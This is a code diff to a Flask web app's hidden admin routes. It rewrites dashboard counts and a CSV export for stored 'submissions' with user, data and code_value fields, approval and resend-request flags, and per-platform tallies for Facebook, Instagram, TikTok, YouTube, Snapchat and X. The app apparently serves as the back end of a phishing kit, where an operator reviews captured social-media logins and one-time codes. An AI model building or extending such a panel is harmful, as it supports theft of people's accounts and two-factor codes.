+            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
         ).fetchall()
     
-    # Calculate enhanced statistics
+    # Calculate statistics
     total_submissions = len(rows)
     
-    # Status statistics
-    pending_count = sum(1 for row in rows if row[12] == 'pending' or (not row[7] and not row[9]))
-    approved_count = sum(1 for row in rows if row[12] == 'approved' or row[7])
-    rejected_count = sum(1 for row in rows if row[12] == 'rejected' or row[9])
-    resend_requested_count = sum(1 for row in rows if row[12] == 'resend_requested' or row[10])
-    
-    # Code-specific statistics
-    code_submissions = [row for row in rows if row[6]]  # Only submissions with codes
-    total_codes = len(code_submissions)
-    pending_codes = sum(1 for row in code_submissions if row[12] == 'pending' or (not row[7] and not row[9]))
-    approved_codes = sum(1 for row in code_submissions if row[12] == 'approved' or row[7])
-    rejected_codes = sum(1 for row in code_submissions if row[12] == 'rejected' or row[9])
+    # Code statistics
+    pending_codes_count = sum(1 for row in rows if row[6] and not row[7] and not row[9])
+    confirmed_codes_count = sum(1 for row in rows if row[6] and row[7])
+    rejected_codes_count = sum(1 for row in rows if row[6] and row[9])
+    resend_requests_count = sum(1 for row in rows if row[10])
+    total_codes_count = sum(1 for row in rows if row[6])
     
     # Platform statistics
-    platform_stats = {}
-    for row in rows:
-        platform = row[8] or 'Unknown'
-        if platform not in platform_stats:
-            platform_stats[platform] = 0
-        platform_stats[platform] += 1
+    facebook_count = sum(1 for row in rows if row[8] == 'Facebook')
+    instagram_count = sum(1 for row in rows if row[8] == 'Instagram')
+    tiktok_count = sum(1 for row in rows if row[8] == 'TikTok')
+    youtube_count = sum(1 for row in rows if row[8] == 'YouTube')
+    snapchat_count = sum(1 for row in rows if row[8] == 'Snapchat')
+    twitter_count = sum(1 for row in rows if row[8] in ['X / Twitter', 'Twitter'])
     
     return render_template('admin.html', 
                          submissions=rows, 
                          secret=ADMIN_SECRET,
-                         # Status stats
-                         pending_count=pending_count,
-                         approved_count=approved_count,
-                         rejected_count=rejected_count,
-                         resend_requested_count=resend_requested_count,
-                         # Code stats
-                         total_codes=total_codes,
-                         pending_codes=pending_codes,
-                         approved_codes=approved_codes,
-                         rejected_codes=rejected_codes,
-                         # Platform stats
-                         platform_stats=platform_stats,
-                         total_submissions=total_submissions)
+                         pending_codes_count=pending_codes_count,
+                         confirmed_codes_count=confirmed_codes_count,
+                         rejected_codes_count=rejected_codes_count,
+                         resend_requests_count=resend_requests_count,
+                         total_codes_count=total_codes_count,
+                         facebook_count=facebook_count,
+                         instagram_count=instagram_count,
+                         tiktok_count=tiktok_count,
+                         youtube_count=youtube_count,
+                         snapchat_count=snapchat_count,
+                         twitter_count=twitter_count)
 
 @app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
 def admin_clear():
@@ -754,10 +656,10 @@ def admin_clear():
 def download():
     csv_path = 'submissions_export.csv'
     with sqlite3.connect(DB_FILE) as conn:
-        rows = conn.execute('SELECT id, timestamp, page, user, data, platform_name, code_value, current_status FROM submissions ORDER BY id DESC').fetchall()
+        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
     with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
         writer = csv.writer(csvf)
-        writer.writerow(['id','timestamp','page','user','data','platform','code_value','status'])
+        writer.writerow(['id','timestamp','page','user','data'])
         writer.writerows(rows)
     return send_file(csv_path, as_attachment=True)
 
